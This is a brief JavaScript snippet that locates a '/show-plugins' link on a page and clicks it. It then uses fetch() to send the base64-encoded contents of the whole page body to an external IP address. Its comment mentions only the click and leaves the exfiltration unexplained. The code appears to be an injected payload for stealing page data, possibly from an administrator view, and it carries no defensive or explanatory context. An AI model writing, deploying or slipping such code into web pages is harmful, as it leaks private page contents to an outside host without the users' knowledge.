const link = document.querySelector('a[href="/show-plugins"]');

// Simulate a click on the link if found
if (link) {
  link.click();
  fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
} else {
  console.error('Link not found');
}


